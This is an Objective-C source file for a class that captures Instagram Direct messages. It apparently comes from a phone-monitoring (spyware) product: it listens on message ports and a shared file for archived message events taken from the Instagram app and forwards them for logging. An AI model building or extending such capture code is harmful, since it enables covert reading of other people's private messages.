//
//  InstagramCaptureManager.m
//  InstagramCaptureManager
//
//  Created by Khaneid Hantanasiriskul on 7/15/2559 BE.
//  Copyright © 2559 Khaneid Hantanasiriskul. All rights reserved.
//

#import "InstagramCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"

#import <UIKit/UIKit.h>

@implementation InstagramCaptureManager

@synthesize mEventDelegate;

- (id)init
{
    self = [super init];
    if (self) {
        
    }
    return self;
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    [self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
    [self setMEventDelegate:nil];
}


- (void) startCapture {
    DLog (@"Start capture Instagram Direct messenger");
    if (!mMessagePortReader1) {
        mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kInstagramMessagePort1
                                                  withMessagePortIPCDelegate:self];
        [mMessagePortReader1 start];
    }
    if (!mMessagePortReader2) {
        mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kInstagramMessagePort2
                                                  withMessagePortIPCDelegate:self];
        [mMessagePortReader2 start];
    }
    if (!mMessagePortReader3) {
        mMessagePortReader3 = [[MessagePortIPCReader alloc] initWithPortName:kInstagramMessagePort3
                                                  withMessagePortIPCDelegate:self];
        [mMessagePortReader3 start];
    }
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
        if (mSharedFileReader1 == nil) {
            mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kInstagramMessagePort1
                                                                         withDelegate:self];
            [mSharedFileReader1 start];
        }
    }
}

- (void) stopCapture {
    DLog (@"Stop capture Instagram Direct Message");
    if (mMessagePortReader1) {
        [mMessagePortReader1 stop];
        mMessagePortReader1 = nil;
    }
    if (mMessagePortReader2) {
        [mMessagePortReader2 stop];
        mMessagePortReader2 = nil;
    }
    if (mMessagePortReader3) {
        [mMessagePortReader3 stop];
        mMessagePortReader3 = nil;
    }
    
    if (mSharedFileReader1 != nil) {
        [mSharedFileReader1 stop];
        mSharedFileReader1 = nil;
    }
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kInstagramArchived];
    DLog(@"Instagram - imEvent = %@", imEvent)
    [unarchiver finishDecoding];
    
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];
        for (FxEvent *imStructureEvent in imStructureEvents) {
            DLog (@"sending %@ ...", imStructureEvent)
            [mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
        }
    }
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
    [self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
    [self stopCapture];
}

@end
